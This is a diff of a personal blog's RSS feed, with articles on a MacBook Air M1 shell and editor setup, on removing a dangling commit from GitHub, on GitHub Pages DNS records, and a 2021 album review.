+<p>My shell setup is pretty simple since a while.  On Arch Linux is used plain bash with a minimal configuration and a custom <a href="https://github.com/klingtnet/dotfiles/tree/master/tools/rusty-prompt">Rust prompt renderer</a>.  The default shell on macOS is <code>zsh</code> so I went with that.  Instead of my own prompt renderer I now use <a href="https://starship.rs/">starship</a> which is pretty powerful out of the box and requires almost no configuration.  This is how my <code>~/.zshrc</code> looks like:</p>
+<pre><code class="language-bash">HISTFILE=~/.zsh_history
+HISTSIZE=999999999
+SAVEHIST=$HISTSIZE
+
+# setopt inc_append_history
+setopt share_history
+setopt hist_ignore_dups
+setopt hist_ignore_space
+
+alias ll='ls -alh'
+alias cdtemp='cd $(mktemp -d)'
+
+# autocompletion
+# https://stackoverflow.com/a/58517668
+autoload -Uz compinit &amp;&amp; compinit -u
+
+# https://stackoverflow.com/a/12403798
+bindkey &quot;^[[1;3C&quot; forward-word
+bindkey &quot;^[[1;3D&quot; backward-word
+
+# ... shell completions were omitted.
+
+eval &quot;$(starship init zsh)&quot;
+</code></pre>
+<p>Before I switched to <a href="https://github.com/alacritty/alacritty/issues/4673">alacritty</a> I was using <a href="https://github.com/gnunn1/tilix">tilix</a> <sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> because it supported terminal splitting, tabs and so on.  The reason for using alacritty was that it used the GPU for rendering and was much smoother.  The downside of alacritty is that it has almost no features (which some might see as a feature itself).  However, I now needed a terminal multiplexer and there is one obvious choice, that is <code>tmux</code>.  Learning tmux was pretty easy since I only needed to know a couple of keyboard shortcuts and it allowed me to use terminal multiplexing independently from the terminal emulator.  That's the reason I continue using it, even though <code>iterm</code> supports terminal multiplexing as well.</p>
+<p>With the advent of Rust and Go a couple of modern alternatives for common shell tools came along.  One of those is <a href="https://github.com/BurntSushi/ripgrep">ripgrep</a>, a replacement for <code>grep</code>, that is pretty fast also quite ergonomic since I save two characters each time I've to <em>grep</em> for something.  Every time I used <code>find</code> I wondered if this tool was implemented in complete isolation because it CLI just feels weird, e.g. the single dash flags like <code>-name</code> and that the path to search in is the first argument, even before the flags.  An alternative is <code>fd</code>, which comes with an easy to use CLI and should provide all the features of <code>find</code>.  I didn't miss anything at least.  There is one more tool I want to tell you about and this is <a href="https://github.com/junegunn/fzf">fzf</a>.  A fuzzy search tool that I mainly use to reverse search in my <code>zsh</code> history.</p>
+<p>We are not finished here, so stay with me for two essential tools in my setup, [pandoc] and <a href="https://imagemagick.org/index.php">imagemagick</a>.  Whenever you need to convert from some document format into another, e.g. from <code>.md</code> into <code>.docx</code>, <code>pandoc</code> has you covered.  You can also mix document formats, it was a great relief to write <a href="https://github.com/klingtnet/master-thesis">my masters thesis</a> in Markdown with some inline LaTeX here and there and let pandoc deal with the conversion into the obnoxious LaTeX syntax.  ImageMagick 🧙🏻‍♂️ comes into play when I need to convert between image file formats or I need to resize a picture.  Great tool but let me give you a tip, never expose it (or ghostscript) to the internet.  I heard the people do that, sigh.</p>
+<p>The end is near, not of the world but of this article.  I am stubborn and refuse to deal with git integrations of any editor or IDE, instead I rebase, cherry-pick, commit and whatnot in the shell.  For this I need a proper editor and the obvious choice is <del>Emacs</del> vim, of course.  The older I get the more my configuration files are converging into standard settings.  My <code>.vim/vimrc</code> is only a couple of lines long:</p>
+<pre><code class="language-viml">&quot; :help vimrc
+&quot; :options
+&quot; to unset use :no&lt;option&gt;
+syntax on
+set number		&quot; set line numbers
+set cursorline		&quot; highlight line of cursor
+set smartindent
+set ttyfast		&quot; indicate fast TTY connection, should improve scrolling behavior
+set hlsearch		&quot; highlight last searched word
+set spell		&quot; enable spellcheck
+set ruler		&quot; show cursor position in status line
+set t_Co=256
+filetype plugin on
+filetype indent on
+colorscheme gruvbox
+</code></pre>
+<p>I hope that was self explanatory.  A pleasant surprise was that <code>vim</code> has its own package manager since version 8.0<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup>.  This means that plugin installation is dead easy now, just create a folder like <code>~/.vim/pack/personal/start</code> and clone all the plugins you need below the <code>start</code> directory.  In my case those plugins are:</p>
+<ul>
+<li><a href="https://github.com/dense-analysis/ale">ale</a> for language server protocol support</li>
+<li><a href="https://github.com/kien/ctrlp.vim">ctrlp</a> to (fuzzy) find files</li>
+<li><a href="https://github.com/vim-airline/vim-airline">vim-airline</a> for a nice status bar</li>
+<li><a href="https://github.com/tpope/vim-surround">vim-surround</a> to easily wrap strings in quotes</li>
+<li><a href="https://github.com/morhetz/gruvbox">gruvbox</a> for some eye candy</li>
+</ul>
+<p>The last thing I did was to setup GPG (PGP?).  I haven't used <a href="https://sequoia-pgp.org/">sequoia</a> yet but I do hope that it comes with a sensible interface, in contrast to GPG.  Every time my key, and its subkeys, is about to expire I need to lookup how I can renew it.  Each time I do wonder why I need to <em>expire</em> the key to renew it.  Anyways, I do sign my git commits and once in a while send and receive encrypted email, hence I need to live with GPGs peculiarities.  For <a href="https://www.thunderbird.net/en-US/">Thunderbird</a> I needed to export my private key into a file, otherwise it couldn't import.  Exporting a private key can be done with:</p>
+<pre><code class="language-sh">$ gpg --output private.pgp --armor --export-secret-key &lt;fingerprint&gt;
+</code></pre>
+<p>Make sure to delete the file afterwards.  A bit more complicated was to setup commit signing.  I found a bunch of articles that describe how to achieve that on macOS but they all had some problems so I will share my setup instructions below:</p>
+<pre><code class="language-bash">$ brew install gnupg pinentry-mac
+$ git config --global user.signingkey &lt;fingerprint&gt;
+$ git config --global commit.gpgsign true
+$ grep pinentry-program ~/.gnupg/gpg-agent.conf
+pinentry-program /opt/homebrew/bin/pinentry-mac
+$ gpgconf --kill gpg-agent
+</code></pre>
+<h2>Audio Applications</h2>
+<p>I will tell you more about my audio software setup in part 2 of this article, the article is already long enough.</p>
+<section class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1" role="doc-endnote">
+<p>Time flies.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2" role="doc-endnote">
+<p>Also the only popular D application I know.&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:3" role="doc-endnote">
+<p>You can find the documentation by running <code>:help packages</code> in vim.&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</section>
+
+
+      </main>
+    </div>
+  </div>
+</body>
+
+</html>
+]]></content:encoded>
+      <author>Andreas Linz</author>
+      <pubDate>Tue, 18 Oct 2022 06:56:02 +0000</pubDate>
+    </item>
+    <item>
+      <title>How to delete unreachable commits on GitHub</title>
+      <link>https://klingt.net/articles/how-to-delete-unreachable-commits-on-github.html</link>
+      <description>GitHub&#39;s search revealed a file in one of my repositories that should not have been published.  The file was part of a commit that was unreachable or free-standing, meaning it was not part of any branch.  In this article I will describe how to find and delete such commits.</description>
+      <content:encoded><![CDATA[<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  
+  <meta name="description" content="GitHub&#39;s search revealed a file in one of my repositories that should not have been published.  The file was part of a commit that was unreachable or free-standing, meaning it was not part of any branch.  In this article I will describe how to find and delete such commits.">
+  
+  <title>How to delete unreachable commits on GitHub</title>
+
+  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
+  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>
+
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
+  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
+  
+  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
+    media="screen and (prefers-color-scheme: light)" />
+  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
+    media="screen and (prefers-color-scheme: dark)" />
+  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
+  <script defer>
+    hljs.highlightAll();
+  </script>
+  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
+</head>
+
+<body>
+  <div class="wrapper">
+    <div class="main">
+      <main>
+        
+<h1>How to delete unreachable commits on GitHub</h1>
+<p>The dangling<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> <a href="https://github.com/klingtnet/klingtnet.github.io/blob/b2444ca54c74a7c9dde6504cf028b6c0f4729d8f/content/resume.md#L3">commit</a> shown in the screenshot below should have never been on GitHub, at least not publicly visible.  The commit was part of a branch called <code>draft</code> that I pushed to the repository when it was still private.  If I am not mistaken then I removed the file, squashed and merged the <code>draft</code> branch into <code>master</code>, deleted the branch and then pushed it onto GitHub.  After making sure that branch <code>draft</code> was gone on GitHub I made the repository public.</p>
+<p><img src="unreachable-commit.png" alt="unreachable commit"></p>
+<p>As you can clearly see the commit is still there, and I only discovered this by accident when using GitHub's search.  So, the question is now how to delete this commit?  I cannot even reach the commit from my local repository:</p>
+<pre><code class="language-shell">$ git show b2444ca54c74a7c9dde6504cf028b6c0f4729d8f
+fatal: bad object b2444ca54c74a7c9dde6504cf028b6c0f4729d8f
+</code></pre>
+<p>Its parent commit is reachable though:</p>
+<pre><code class="language-shell">$ git show 01aea0c8e1bdceb7869403814a4ebb87e25883b2
+commit 01aea0c8e1bdceb7869403814a4ebb87e25883b2
+Author: Andreas Linz &lt;klingt.net@gmail.com&gt;
+Date:   Sun Jul 25 16:18:10 2021 +0200
+
+    Initial commit
+</code></pre>
+<p>If the commit would still be part of my local repository I could have removed it with this call and subsequent <code>git push</code>.</p>
+<pre><code class="language-shell">$ git reflog expire --expire-unreachable=all
+</code></pre>
+<p>But, nothing happens since the commit is not in my local repository.  What to do now 🤔?  As far as I see there is nothing I can do locally and cloning the repository will also omit the commit I want to delete.  GitHub must trigger the garbage collection for this repository so I <a href="https://support.github.com/ticket/">opened a ticket</a> with them.  What really amazed me was how fast they responded, after 10 minutes everything was done and that's for a free account!  Here's what they wrote in the response:</p>
+<blockquote>
+<p>As you mentioned, it does indeed appear to be an an unreferenced commit dangling in our cache. I went ahead and performed the garbage collection and cache clearance operations for the repository klingtnet/klingtnet.github.io. Attempting to access the commit directly now returns a 404.</p>
+</blockquote>
+<p>Luckily the commit contained no secrets, but what I learned from this lesson is that I need to double or triple check the contents of my repository before making it public on GitHub.  A simple deletion of a branch might not be sufficient.</p>
+<section class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1" role="doc-endnote">
+<p>Dangling, free-standing, unreachable or unreferenced, all terms fit here.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</section>
+
+
+      </main>
+    </div>
+  </div>
+</body>
+
+</html>
+]]></content:encoded>
+      <author>Andreas Linz</author>
+      <pubDate>Tue, 18 Oct 2022 06:56:02 +0000</pubDate>
     </item>
     <item>
       <title>(Almost) 30 Best Albums of 2021</title>
@@ -515,7 +858,7 @@ Instead of requiring a method on <code>T</code> let <code>AppendIfNew</code> acc
 <p><img src="https://f4.bcbits.com/img/a1654242133_16.jpg" alt="Album Art of Roy Montgomery - 40th Anniversary 2021 LP Series"></p>
 <p>Roy Montgomery.  <a href="https://grouper.bandcamp.com/">Grouper</a>'s 2009 <a href="https://www.discogs.com/master/214067-Roy-Montgomery-Grouper-Roy-Montgomery-Grouper">split EP</a> introduced me to the music of the New Zealand based guitarist and it also spawned my love for drone and ambient music.  I cannot exactly say what makes me love his music so much, but somehow the layered guitar tunes together with the ethereal reverb in the background create an atmosphere that makes me comfy, and which reminds of warm and sunny summer days that I spent in the country side (or that I just imagined while daydreaming).  For me it's just the perfect music to relax and drift away with my thoughts.</p>
 <p>When <a href="https://www.grapefruitrecordclub.com/">Grapefruit Record Club</a> announced the 40th anniversary LP series I haven't given it a second thought and pre-ordered the vinyls the same day, planning to make myself a little christmas present.  But, shipping was delayed to January 2022 because of an unprecedented backup at pressing plants (<a href="https://www.vox.com/the-goods/2021/11/22/22797290/adele-vinyl-record-supply-chain-delays">damn you Adele!</a>).</p>
-<p>Roy Montgometen to them, <a href="https://www.youtube.com/watch?v=MpwKdaPCcII&amp;t=592s">Too Hot to Dry</a> and <a href="https://www.youtube.com/watch?v=MpwKdaPCcII&amp;t=1714s">High Tension House</a>.  His music is melancholic while being still positive, hard to describe.  This tension might be the reason I'm so fascinated by it.</p>
+<p>Roy Montgomery might be best known for his work with Dadamah, an experimental rock/shoegaze group where he sang and played guitar.  Their sole album, <em>This is Not a Dream</em>, contains two tracks that still give me goosebumps whenever I listen to them, <a href="https://www.youtube.com/watch?v=MpwKdaPCcII&amp;t=592s">Too Hot to Dry</a> and <a href="https://www.youtube.com/watch?v=MpwKdaPCcII&amp;t=1714s">High Tension House</a>.  His music is melancholic while being still positive, hard to describe.  This tension might be the reason I'm so fascinated by it.</p>
 <p>In an interview, I read about him, he said that he is a self-taught guitarist. This gives me hope that I can sometimes create similar atmospheres on my guitar.  One of my new year's resolutions is to finally take guitar lessons, no excuses anymore.</p>
 <iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=2966139599/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://grapefruit1.bandcamp.com/album/roy-montgomery-40th-anniversary-2021-lp-series">Roy Montgomery 40th Anniversary 2021 LP Series by Roy Montgomery</a></iframe>
 <h2>Skee Mask — Pool</h2>
@@ -686,316 +1029,7 @@ Instead of requiring a method on <code>T</code> let <code>AppendIfNew</code> acc
 </html>
 ]]></content:encoded>
       <author>Andreas Linz</author>
-      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
-    </item>
-    <item>
-      <title>GitHub Pages DNS Setup</title>
-      <link>https://klingt.net/articles/github-pages-dns-setup.html</link>
-      <description>In this article I describe the DNS setup for my GitHub Pages website which is served under the www subdomain and the apex or base domain.</description>
-      <content:encoded><![CDATA[<!doctype html>
-<html lang="en">
-
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  
-  <meta name="description" content="In this article I describe the DNS setup for my GitHub Pages website which is served under the www subdomain and the apex or base domain.">
-  
-  <title>GitHub Pages DNS Setup</title>
-
-  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
-  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>
-
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
-  
-  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
-    media="screen and (prefers-color-scheme: light)" />
-  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
-    media="screen and (prefers-color-scheme: dark)" />
-  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
-  <script defer>
-    hljs.highlightAll();
-  </script>
-  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
-</head>
-
-<body>
-  <div class="wrapper">
-    <div class="main">
-      <main>
-        
-<h1>GitHub Pages DNS Setup</h1>
-<p>I chose <a href="https://guides.github.com/features/pages/">GitHub Pages</a> to serve <a href="https://github.com/klingtnet/klingtnet.github.io">this website</a>.  By default a GitHub Pages website is served under <code>&lt;repo&gt;.github.io</code>, which is fine but not what I wanted.  As this is a replacement for my old website I wanted it to be served under my domain <code>klingt.net</code>.</p>
-<p>Fortunately, setting up a GitHub pages website is pretty easy.  Just create a repository and set the branch and directory which contains the website files in the repositories Pages settings.  <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
-<p><img src="/articles/github-pages-settings-source-dialog.png" alt="GitHub Pages settings source dialog"></p>
-<p>Adding a custom domain is also straightforward and <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/about-custom-domains-and-github-pages#supported-custom-domains">GitHub's excellent documentation has you covered</a> as usual.  For my case I wanted to serve this website to be served under the <code>www</code> subdomain, that is <code>www.klingt.net</code>, and the apex or base domain <code>klingt.net</code>.  Configuring an apex domain requires an additional step which is why I decided to write this article.</p>
-<p>First things first, let's start with setting up the required DNS records.  For the <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/about-custom-domains-and-github-pages#supported-custom-domains"><code>www</code> subdomain</a> I just needed to add a <code>CNAME</code> record that points <code>www.klingt.net</code> to <code>klingtnet.github.io</code>.  I use <code>dig</code> for debugging or showing DNS records and in the following command you will see how to retrieve a <code>CNAME</code> record for a domain:</p>
-<pre><code class="language-sh">$ dig +noall +answer www.klingt.net CNAME
-www.klingt.net.         3600    IN      CNAME   klingtnet.github.io.
-</code></pre>
-<p>If you do not have a shell available, e.g. because you're reading this article from a phone or from a Windows machine &#x1f644;, you can use online tools liks <a href="https://dns-lookup.jvns.ca">https://dns-lookup.jvns.ca</a>.</p>
-<p>Setting up the <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/about-custom-domains-and-github-pages#using-an-apex-domain-for-your-github-pages-site">apex domain</a> is a bit more complicated because there are no <code>CNAME</code> records for this type of domain.  Instead, you can just define an <a href="https://support.dnsimple.com/articles/alias-record/"><code>ALIAS</code></a> record that—as the name suggests—alias <code>klingt.net</code> with <code>www.klingt.net</code>.  Let's do a DNS query using <code>dig</code> for the <code>ALIAS</code> record:</p>
-<pre><code class="language-sh">$ dig +noall +answer klingt.net ALIAS
-klingt.net.             929     IN      A       185.199.109.153
-klingt.net.             929     IN      A       185.199.111.153
-klingt.net.             929     IN      A       185.199.108.153
-klingt.net.             929     IN      A       185.199.110.153
-</code></pre>
-<p>You might wonder why the <code>ALIAS</code> record is not showing up in the result.  This is perfectly fine because the name server resolves an ALIAS directly into A (IPv4) or AAAA (IPv6) records.</p>
-<p>The last thing you need to do is to set the default domain under which your domain should be served, again in the Pages settings dialog of the GitHub repository:</p>
-<p><img src="/articles/github-pages-settings-domain-dialog.png" alt="GitHub Pages settings domain dialog"></p>
-<p>Doing this will create a <a href="https://github.com/klingtnet/klingtnet.github.io/blob/4bd965fa2772ccfc3c69bc5d22ed76d2b9fc65f0/static/CNAME"><code>CNAME</code> file</a> in the source branch that you've initially configured.  Make sure to pull the commit that created this file or manually add it to your website contents.</p>
-<p>Et Voilà!  Your website should now be served under your custom domain with a valid HTTPS certificate.</p>
-<section class="footnotes" role="doc-endnotes">
-<hr>
-<ol>
-<li id="fn:1" role="doc-endnote">
-<p>Configuring the source branch and directory is something I always forget to do and then I'm wondering why my website does not show up &#x1f605;&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
-</li>
-</ol>
-</section>
-
-
-      </main>
-    </div>
-  </div>
-</body>
-
-</html>
-]]></content:encoded>
-      <author>Andreas Linz</author>
-      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
-    </item>
-    <item>
-      <title>My MacBook Air M1 setup</title>
-      <link>https://klingt.net/articles/my-macbook-air-m1-setup.html</link>
-      <description>I recently made myself a present and bought a MacBook Air M1.  This is my first macOS machine and in this article I will let you know which productivity tools I use, what other software and how my basic configuration looks like.</description>
-      <content:encoded><![CDATA[<!doctype html>
-<html lang="en">
-
-<head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  
-  <meta name="description" content="I recently made myself a present and bought a MacBook Air M1.  This is my first macOS machine and in this article I will let you know which productivity tools I use, what other software and how my basic configuration looks like.">
-  
-  <title>My MacBook Air M1 setup</title>
-
-  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
-  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>
-
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
-  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
-  
-  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
-    media="screen and (prefers-color-scheme: light)" />
-  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
-    media="screen and (prefers-color-scheme: dark)" />
-  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
-  <script defer>
-    hljs.highlightAll();
-  </script>
-  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
-</head>
-
-<body>
-  <div class="wrapper">
-    <div class="main">
-      <main>
-        
-<h1>Preface</h1>
-<p>It was in the very early nineties when I first used a computer.  It must have been the 286 of my neighbor or the Amiga of my cousin.  A couple of years later, I think when I was in 4th grade, I got my first own computer.  A 486DX2-66 with 8 megs of RAM and a horribly slow 1GB SCSI hard drive, connected through an Adaptec ISA SCSI Controller card.  Not only was the hard drive slow as hell, maybe 1 MB/s at tops, it was also very noisy.  Annoyingly loud to be honest, like if it wrote every bit with a chisel into stone.  This machine ran MS-DOS and so I learned how to remove unnecessary drivers from <code>autoexec.bat</code>, like the mouse driver, in order to free up a couple kilobytes of RAM so that I can play DOOM or whatever.</p>
-<p>Anyways, couple years later I got my first Windows PC, an AMD k6-2 with 333MHz that was equipped with the famous IBM Deskstar hard drive.  This hard disk was even noisier as my old SCSI drive while also being very unreliable, hence they were also known as IBM Deathstar.  Of course you can imagine how funny it was to ship the broken drive to IBM's service center somewhere in Great Britain, waiting for it to be returned so that I have a working PC again.  It took them over a month, or longer, to return the drive which meant that I had no computer in the meantime.  Actually, I didn't even know if they had received the drive or if it got lost in the english channel.  You just had to wait patiently in the good ol' days.  Unimaginable in today's world, people would get mad if they didn't receive an update every couple of hours.  Somehow people still knew how to be patient back then, and so was I, which meant that I had to spent my time with other things.  Internet was still something new and the time you were online could be counted in minutes a day.  This is probably one of the reasons for people being patient.  Having no smartphone meant that the ordinary folk still had an attention spans longer than a fart lasts, which means they could read a book or watch a movie without being distracted.  Hell, they even managed to meet each other to talk and have some beers (I do miss that since COVID).</p>
-<p>Sorry, I was drifting away, thing is, I wanted to tell that I was a Windows user until I began to study computer science in 2010.  I slowly moved over to Linux then and used it ever since, which means I am a <del>penguin</del> Linux user for more than 9 years now<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup>.  However, I always missed my favorite audio software in Linux, even though it got better in recent years with Wine, <a href="https://github.com/robbert-vdh/yabridge">yabridge</a>, <a href="https://www.bitwig.com/">Bitwig</a>, and <a href="https://pipewire.org/">pipewire</a>.  Still, it isn't a lot of fun because there is so much configuration involved.  But not only that, every so often something breaks and after ten minutes fixing whatever has failed you give up and do something else, which is not music making.</p>
-<p>For quite some time now I've been arguing with myself if I can justify to get a Mac and be done with it.  Some years ago this would have been a serious financial decision but now I earn enough so that I can just buy one if I want one.  This is a privilege and I'm well aware of that.  But trust me, I still know way to well what it means to have almost no spare money.</p>
-<p>Maybe it's only me but computers should just work.  I happily pay the additional price if it means that I don't have to deal with bug trackers in my rare free time.  The mac solves exactly that for me.  It just works and I have (almost) the best of both worlds, all my favorite audio software as well as all the developer tools I need.  Except that docker sucks really big on Apple, but that's okay for me.  With the introduction of Apple silicon there is also less reason to keep on x86.  The M1 chips are the biggest performance impact since SSDs entered the home computer market.  I received an M1 MacBook Pro from my employee, the 2020 model not the M1 Pro, and the machine is great and almost as fast as my Ryzen 3700x desktop.  Of course, the touch bar is garbage and I understand why they ditched it with the new models.  Eventually I decided to buy myself a present and get the better and slightly cheaper alternative to the 2020 MacBook Pro, the fan-less MacBook Air.  This thing is fast, battery life feels endless it is always dead silent.  The fan in the Pro model is also off almost all of the time, but knowing that there isn't even fan inside is just mind blowing, regarding how noisy laptops commonly are.  For now I can just say that I 💚 this thing.</p>
-<h1>My MacBook Air M1 Setup</h1>
-<p>Here's the list of things I installed on the MacBook Air:</p>
-<p>First thing I did was to install Firefox with two extensions <a href="https://addons.mozilla.org/en-US/firefox/addon/multi-account-containers/">multi-account containers</a> and <a href="https://addons.mozilla.org/en-US/firefox/addon/ublock-origin/?utm_source=addons.mozilla.org&amp;utm_medium=referral&amp;utm_content=search">ublock origin</a> of course.  It should be prohibited to use a web browser without ad blocker.</p>
-<p>Now it was time to get <a href="https://obsidian.md/">Obsidian</a> so that I can take notes.  As for most tools I just use the default configuration, except that I have activated the daily notes extension.  This extension allows to easily create a page from a template for each day, where my template looks like this:</p>
-<pre><code class="language-md"># {{date}}
-
-- placeholder
-
-## Tasks
-
-- [ ] a task
-</code></pre>
-<p>Another indispensable tool is <a href="https://keepassxc.org/">KeePassXC</a>.  Honestly, I don't know most of my passwords and I don't care to since KeePass does that for me.</p>
-<p>Having a password manager installed meant that I can lookup my Apple password to sign in into my Apple account.  Otherwise I could not install anything from the app store.  The mac app store is the same garbage as all the other ones and I think they are a bad idea.</p>
-<p>Let's go on with another Mozilla tool that I use daily and this is <a href="https://www.thunderbird.net/en-US/">Thunderbird</a>.  I could use Apple Mail but there is no way to only accept text mails with this fancy app, so I just stick with the ⚡️🕊.  Once in a while I send a GPG encrypted email, which is also a no go for Apples hipster mail client.</p>
-<p>What really amazed me after years of Linux desktop usage was that CalDav (calendar) and CardDav (address book) is very well integrated into the system and it took me like 30s to connect it to my <a href="https://www.fastmail.com/">Fastmail</a> account.  The calendar app is fine by the way.</p>
-<p>Despite being no flat-earther I do like <a href="https://telegram.org/">Telegram</a> for it's thin desktop client.  They still know how to build a cross platform app that doesn't require to load a browser in the background.</p>
-<p>Don't worry my dear reader, I also use <a href="https://signal.org/">Signal</a>, one does not rule out the other.</p>
-<p>Admittedly, window management is very primitive on macOS.  I have tried tiling window managers on Linux but I didn't like them too much, probably because they required days of configuration until they were usable.  I'm simple in that regards and just wanted to have something like Aero Snap on Windows, that is tiling windows by dragging them to a screen border.  For macOS there was an app called Hookshot that was recently renamed to <a href="https://rectangleapp.com/pro">Rectangle</a>.  I payed for Rectangle App but I only use windows snapping.  Renaming an app from something easy to google to a generic term like rectangle is a questionable decision to begin with, but if you have already installed Hookshot and want to upgrade to Rectangle I recommend to uninstall it and power cycle the machine.  This is no joke, window snapping still didn't work after a reboot but after I powered the laptop on and off.  Don't ask, I would like to know as well why this was necessary (I don't refer to the renaming here 😅).</p>
-<p>Another thing which annoyed me on macOS is that you cannot switch between windows of the same app using <code>&lt;cmd&gt;+&lt;tab&gt;</code>.  Some expert had the fantastic idea to hide this functionality behind <code>&lt;cmd&gt;+~</code>, hope that whoever did that is happy now.  Gnome replicated the same idiotic behavior but at least you could configure it.  Well, there is a great open source app called <a href="https://alt-tab-macos.netlify.app">alt-tab</a> for macOS which binds by default to <code>&lt;option&gt;+&lt;tab&gt;</code> and provides a sensible application switcher.</p>
-<p>Time to install a code editor.  My weapon of choice is <del>GNU Emacs</del> <a href="https://code.visualstudio.com/">VS Code</a>.  I try to keep the number of extensions minimal and use whatever is the default suggestion for a file type.  There is one additional setup to do on macOS that is to run <code>Shell Command: Install 'code' command in PATH</code> with <code>&lt;ctrl&gt;+P</code> so that I can start VS Code from within a terminal.</p>
-<p><a href="https://go.dev/">Go</a> go go!</p>
-<p>It breaks my heart but I also need to install <a href="https://www.jetbrains.com/idea/">JetBrains IDEA</a> in the community edition because there still is <a href="https://github.com/klingtnet/bitwig-extensions">a Java repository I need to work on</a>.</p>
-<p>I am a <a href="https://www.ibm.com/plex/">IBM Plex</a> convert and now use <a href="https://www.jetbrains.com/lp/mono/">JetBrains Mono</a> as my monospace font of choice.</p>
-<p><a href="https://www.spotify.com/de/">Spotify</a>, the billion dollar company that is unable to distinguish two artists with the same name.  The day I figure out how to properly handle ID3 tags with Go will be the day I cancel my Spotify subscription and remove their electron monstrosity.  Till then I will use their app and live with the limitation of 10k songs per playlist.  Oh, one additional thing, make sure to disable <em>Normalize Volume</em>, all it does is to make everything half as loud which is not what I understand of volume normalization but what do I know.</p>
-<p>Once in a while I need to create or work with vector graphics and so I bought <a href="https://affinity.serif.com/en-us/designer/">Affinity Designer</a> while it was on x-mas sale two years ago.  I am by far no expert in this domain, but let me tell you, I would prefer this to Adobe Illustrator any time of the day.  Even without a discount, 55€ is more than fair for the software you get.  You could also buy a tube of <a href="https://www.supremenewyork.com/previews/fallwinter2020/accessories/supreme-colgate-toothpaste">Supreme Toothpaste</a> for that money, depends on if you already gave up or not.</p>
-<p><a href="https://github.com/MonitorControl/MonitorControl/">MonitorControl</a> is another great piece of software.  Controlling the brightness of my external display like for the integrated one is a feature I always wanted.  For Linux there is an alternative called <a href="https://github.com/ddccontrol/ddccontrol">ddccontrol</a> but it's not as neatly integrated as MonitorControl is.</p>
-<p><a href="https://rust-lang.org">Rust</a>, once my favorite programming language, is also something I use regularly, even though not as often as I should.  The language toolchain is best installed using <a href="https://rustup.rs/">rustup</a>.</p>
